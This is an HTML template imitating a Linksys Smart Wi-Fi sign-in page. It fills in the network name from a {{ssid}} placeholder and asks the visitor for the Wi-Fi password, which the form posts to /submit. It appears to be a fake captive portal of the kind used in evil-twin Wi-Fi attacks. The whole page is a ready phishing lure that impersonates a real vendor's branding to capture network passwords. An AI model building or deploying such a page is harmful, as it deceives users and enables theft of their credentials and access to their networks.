<!DOCTYPE html>
<html>
<head>
    <title>Linksys Smart Wi-Fi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <style>
        body {
            font-family: "Segoe UI", Arial, sans-serif;
            background: #f7f7f7;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            margin: 50px auto;
            background: white;
            border-radius: 6px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .header {
            background: linear-gradient(to right, #0066cc, #0099ff);
            color: white;
            padding: 30px;
            text-align: center;
            border-radius: 6px 6px 0 0;
        }
        .logo {
            font-size: 26px;
            font-weight: 300;
            letter-spacing: 2px;
        }
        .subtitle {
            font-size: 14px;
            margin-top: 5px;
            opacity: 0.9;
        }
        .content {
            padding: 35px;
        }
        .welcome {
            text-align: center;
            margin-bottom: 25px;
            color: #666;
        }
        .form-group {
            margin-bottom: 18px;
        }
        label {
            display: block;
            margin-bottom: 6px;
            font-size: 13px;
            color: #555;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 11px;
            border: 1px solid #d0d0d0;
            border-radius: 4px;
            font-size: 14px;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border-color: #0066cc;
        }
        button {
            width: 100%;
            padding: 13px;
            background: #0066cc;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 15px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background: #0055aa;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">LINKSYS</div>
            <div class="subtitle">Smart Wi-Fi</div>
        </div>
        <div class="content">
            <div class="welcome">
                <p>Connect to your wireless network</p>
            </div>
            <form method="POST" action="/submit">
                <div class="form-group">
                    <label>Network Name</label>
                    <input type="text" name="ssid" value="{{ssid}}" required>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" required placeholder="Enter network password">
                </div>
                <button type="submit">Sign In</button>
            </form>
        </div>
    </div>
</body>
</html>
